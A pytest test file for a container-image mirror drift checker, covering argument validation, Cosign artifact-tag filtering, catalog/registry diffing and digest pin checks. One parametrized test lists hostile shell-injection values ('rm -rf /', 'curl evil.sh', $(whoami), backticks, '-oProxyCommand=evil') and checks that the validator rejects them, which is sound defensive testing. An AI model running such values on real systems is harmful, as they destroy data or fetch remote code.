"""Tests for scripts/check_mirror_drift.py.

Covers the pure logic: Cosign artifact-tag filtering, the bidirectional
catalog/registry diff, and catalog flattening. The crane-backed functions are
network calls and are exercised by running the script, not by these tests.
"""

from __future__ import annotations

import sys
import textwrap
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))
import check_mirror_drift  # noqa: E402
from check_mirror_drift import (  # noqa: E402
    UnsafeArgumentError,
    diff_tags,
    is_artifact_tag,
    parse_catalog,
    validate_args,
)

# ---------------------------------------------------------------------------
# validate_args: nothing reaches the process boundary unvalidated
# ---------------------------------------------------------------------------


class TestValidateArgs:
    def test_ordinary_reference_passes(self):
        args = ["digest", "dhi.io/python:3.14-debian13"]
        assert validate_args(args) == args

    def test_digest_reference_passes(self):
        args = ["digest", "gcr.io/distroless/static-debian12@sha256:" + "a" * 64]
        assert validate_args(args) == args

    def test_flags_pass_through(self):
        args = ["digest", "dhi.io/python:3.14", "--platform", "linux/amd64"]
        assert validate_args(args) == args

    @pytest.mark.parametrize(
        "hostile",
        [
            "dhi.io/python; rm -rf /",
            "dhi.io/python && curl evil.sh",
            "dhi.io/python$(whoami)",
            "dhi.io/python|tee",
            "dhi.io/python\nnewline",
            "dhi.io/python with space",
            "`backtick`",
            "-oProxyCommand=evil",
            "",
        ],
    )
    def test_hostile_values_are_rejected(self, hostile: str):
        """A catalog is a YAML file any PR can edit; treat its values as input."""
        with pytest.raises(UnsafeArgumentError):
            validate_args(["digest", hostile])


# ---------------------------------------------------------------------------
# is_artifact_tag: Cosign artifacts must not be reported as orphaned images
# ---------------------------------------------------------------------------


class TestIsArtifactTag:
    def test_cosign_digest_tag_is_artifact(self):
        """A bare sha256-<hex> tag is a Cosign artifact, not an image."""
        assert is_artifact_tag("sha256-4d52ef30b64eb8400ade379926ac15249f7441554e")

    def test_cosign_signature_suffix_is_artifact(self):
        assert is_artifact_tag("sha256-abc123.sig")

    def test_normal_version_tag_is_not_artifact(self):
        assert not is_artifact_tag("3.14-debian13")

    def test_latest_is_not_artifact(self):
        assert not is_artifact_tag("latest")

    def test_tag_merely_containing_sha256_is_not_artifact(self):
        """Only a leading sha256- marks an artifact; substrings do not."""
        assert not is_artifact_tag("v1-sha256-something")


# ---------------------------------------------------------------------------
# diff_tags: both directions, because each hides a different failure
# ---------------------------------------------------------------------------


class TestDiffTags:
    def test_exact_match_yields_no_drift(self):
        declared = {"3.12-debian13", "3.14-debian13"}
        published = {"3.12-debian13", "3.14-debian13"}
        assert diff_tags(declared, published) == ([], [])

    def test_declared_but_unpublished_is_missing(self):
        missing, orphans = diff_tags(
            {"3.12-debian13", "3.14-debian13"}, {"3.12-debian13"}
        )
        assert missing == ["3.14-debian13"]
        assert orphans == []

    def test_published_but_undeclared_is_orphan(self):
        missing, orphans = diff_tags(
            {"3.12-debian13"}, {"3.12-debian13", "3.13-debian13"}
        )
        assert missing == []
        assert orphans == ["3.13-debian13"]

    def test_cosign_artifacts_are_not_reported_as_orphans(self):
        published = {"3.12-debian13", "sha256-deadbeef", "sha256-cafebabe.sig"}
        missing, orphans = diff_tags({"3.12-debian13"}, published)
        assert missing == []
        assert orphans == []

    def test_both_directions_reported_together(self):
        missing, orphans = diff_tags({"a", "b"}, {"b", "c"})
        assert missing == ["a"]
        assert orphans == ["c"]

    def test_results_are_sorted_for_stable_output(self):
        missing, orphans = diff_tags({"z", "a", "m"}, set())
        assert missing == ["a", "m", "z"]


# ---------------------------------------------------------------------------
# parse_catalog
# ---------------------------------------------------------------------------

CATALOG = textwrap.dedent(
    """
    apiVersion: v1
    kind: ImageCatalog
    images:
      - id: dhi-python-314
        upstream:
          registry: dhi.io
          name: python
          tag: "3.14-debian13"
        ghcr:
          name: dhi-python
          tag: "3.14-debian13"
        platform_compatibility:
          default: linux/amd64
      - id: distroless-static
        upstream:
          registry: gcr.io
          name: distroless/static
          tag: latest
        ghcr:
          name: distroless-static
          tag: latest
    """
)


class TestParseCatalog:
    def test_builds_fully_qualified_refs(self, tmp_path: Path):
        path = tmp_path / "images.yaml"
        path.write_text(CATALOG)
        entries = parse_catalog(path)
        assert entries[0]["source"] == "dhi.io/python:3.14-debian13"
        assert entries[0]["target"] == (
            "ghcr.io/byronwilliamscpa/dhi-python:3.14-debian13"
        )

    def test_platform_defaults_to_amd64_when_absent(self, tmp_path: Path):
        """A missing platform_compatibility block must not crash the check."""
        path = tmp_path / "images.yaml"
        path.write_text(CATALOG)
        entries = parse_catalog(path)
        assert entries[1]["platform"] == "linux/amd64"

    def test_tags_are_stringified(self, tmp_path: Path):
        """YAML may parse a bare tag as a number; digests need a string."""
        path = tmp_path / "images.yaml"
        path.write_text(
            textwrap.dedent(
                """
                images:
                  - id: dhi-redis-7
                    upstream: {registry: dhi.io, name: redis, tag: "7-debian13"}
                    ghcr: {name: dhi-redis, tag: 7}
                """
            )
        )
        entries = parse_catalog(path)
        assert entries[0]["ghcr_tag"] == "7"

    def test_absent_pin_is_none(self, tmp_path: Path):
        path = tmp_path / "images.yaml"
        path.write_text(CATALOG)
        entries = parse_catalog(path)
        assert entries[0]["pin"] is None


# ---------------------------------------------------------------------------
# check_pins: an unread pin still rots, and a rotted pin misleads
# ---------------------------------------------------------------------------

PIN = "sha256:" + "a" * 64
OTHER = "sha256:" + "b" * 64


class TestCheckPins:
    @staticmethod
    def _entry(pin):
        return {
            "id": "distroless-static",
            "source": "gcr.io/distroless/static-debian12:latest",
            "platform": "linux/amd64",
            "pin": pin,
        }

    def test_unpinned_entries_are_skipped(self, monkeypatch):
        """No pin means nothing to verify; crane must not even be called."""
        monkeypatch.setattr(
            check_mirror_drift, "run_crane", lambda a: pytest.fail("crane called")
        )
        assert check_mirror_drift.check_pins([self._entry(None)]) == []

    def test_pin_matching_index_digest_is_clean(self, monkeypatch):
        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: PIN)
        assert check_mirror_drift.check_pins([self._entry(PIN)]) == []

    def test_pin_matching_platform_digest_is_clean(self, monkeypatch):
        """The catalog does not record which digest form was pinned."""
        monkeypatch.setattr(
            check_mirror_drift,
            "run_crane",
            lambda args: PIN if "--platform" in args else OTHER,
        )
        assert check_mirror_drift.check_pins([self._entry(PIN)]) == []

    def test_pin_matching_neither_is_reported(self, monkeypatch):
        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: OTHER)
        drifted = check_mirror_drift.check_pins([self._entry(PIN)])
        assert len(drifted) == 1
        img_id, pin, resolved = drifted[0]
        assert img_id == "distroless-static"
        assert pin == PIN
        assert resolved == [OTHER]

    def test_unresolvable_source_is_not_reported_as_drift(self, monkeypatch):
        """A failed registry query is missing evidence, not evidence of drift."""
        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: None)
        assert check_mirror_drift.check_pins([self._entry(PIN)]) == []
